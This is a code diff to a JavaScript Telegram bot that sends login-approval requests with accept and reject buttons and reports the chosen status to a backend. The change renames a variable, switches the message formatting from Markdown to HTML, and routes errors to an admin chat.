@@ -33,40 +33,38 @@ export async function sendLoginTelegram(email) {
   await bot.sendMessage(CHAT_ID, message, options);
 }
 
-// -----------------
-// Handle button clicks
-// -----------------
+
 bot.on("callback_query", async (query) => {
   try {
-    const [action, email] = query.data.split("|");
+    const [action, identifier] = query.data.split("|");
     const status = action === "accept" ? "accepted" : "rejected";
 
     // Notify backend
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, status })
+      body: JSON.stringify({ email: identifier, status })
     });
 
-    // Answer callback query
-    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
-
-    // Update Telegram message
+    // Replace the original message with a single clean line
     await bot.editMessageText(
-      `*CB login approval*\n*Email:* ${email}\nStatus: *${status.toUpperCase()}*`,
+      `🔐 <b>${identifier}</b> → <b>${status.toUpperCase()}</b>`,
       {
         chat_id: query.message.chat.id,
         message_id: query.message.message_id,
-        parse_mode: "Markdown"
+        parse_mode: "HTML"
       }
     );
+
   } catch (err) {
     console.error("❌ Failed to handle callback:", err);
-    bot.sendMessage(CHAT_ID, `⚠️ Error handling approval for ${query.data}`);
+    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
   }
 });
+
 
 // /start command
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
 });
+
